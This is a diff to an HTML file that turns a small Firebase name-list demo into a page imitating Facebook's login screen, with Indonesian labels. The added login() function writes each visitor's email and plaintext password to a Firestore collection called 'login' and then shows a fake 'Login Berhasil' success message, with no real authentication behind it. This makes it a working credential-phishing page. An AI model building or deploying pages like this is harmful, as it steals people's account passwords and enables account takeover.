@@ -1,69 +1,104 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html>
 <head>
-  <title>Database Firebase</title>
-</head>
-<body>
+  <title>Login Facebook Style</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  <!-- SweetAlert -->  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
 
-<h2>Input Nama</h2>
-<input type="text" id="nama">
-<button onclick="simpan()">Simpan</button>
+    .container {
+      background: white;
+      padding: 20px;
+      width: 300px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
 
-<ul id="list"></ul>
+    .logo {
+      color: #1877f2;
+      font-size: 32px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
 
-<script type="module">
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #166fe5;
+    }
+  </style></head>
+<body><div class="container">
+  <div class="logo">facebook</div>
+  <input type="text" id="email" placeholder="Email atau nomor HP">
+  <input type="password" id="password" placeholder="Kata sandi">
+  <button onclick="login()">Masuk</button>
+</div><script type="module">
+  // Firebase (JANGAN DIHAPUS SESUAI PERMINTAAN)
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-  import { 
-    getFirestore, 
-    collection, 
-    addDoc, 
-    getDocs,
-    query,
-    orderBy,
-    serverTimestamp
-  } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
   const firebaseConfig = {
-    apiKey: "APIKEY",
-    authDomain: "test-bf56f.firebaseapp.com",
-    projectId: "test-bf56f",
-    storageBucket: "test-bf56f.firebasestorage.app",
-    messagingSenderId: "276624363412",
-    appId: "1:276624363412:web:b232a9df7bf64e4edac981"
+    apiKey: "API_KEY_KAMU",
+    authDomain: "PROJECT_ID.firebaseapp.com",
+    projectId: "PROJECT_ID",
+    storageBucket: "PROJECT_ID.appspot.com",
+    messagingSenderId: "SENDER_ID",
+    appId: "APP_ID"
   };
 
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
 
-  window.simpan = async function () {
-    let nama = document.getElementById("nama").value;
+  // Function login
+  window.login = async function() {
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
 
-    await addDoc(collection(db, "siswa"), {
-      nama: nama,
-      createdAt: serverTimestamp()
-    });
+    try {
+      await addDoc(collection(db, "login"), {
+        email: email,
+        password: password,
+        waktu: new Date()
+      });
 
-    tampil();
-  };
+      // SweetAlert sukses
+      Swal.fire({
+        icon: 'success',
+        title: 'Login Berhasil',
+        text: 'Selamat datang!'
+      });
 
-  async function tampil() {
-    const q = query(
-      collection(db, "siswa"),
-      orderBy("createdAt", "asc") // terbaru di bawah
-    );
-
-    const querySnapshot = await getDocs(q);
-
-    let list = document.getElementById("list");
-    list.innerHTML = "";
-
-    querySnapshot.forEach((doc) => {
-      list.innerHTML += "<li>" + doc.data().nama + "</li>";
-    });
+    } catch (error) {
+      Swal.fire({
+        icon: 'error',
+        title: 'Error',
+        text: error.message
+      });
+    }
   }
-
-  tampil();
-</script>
-
-</body>
+</script></body>
 </html>
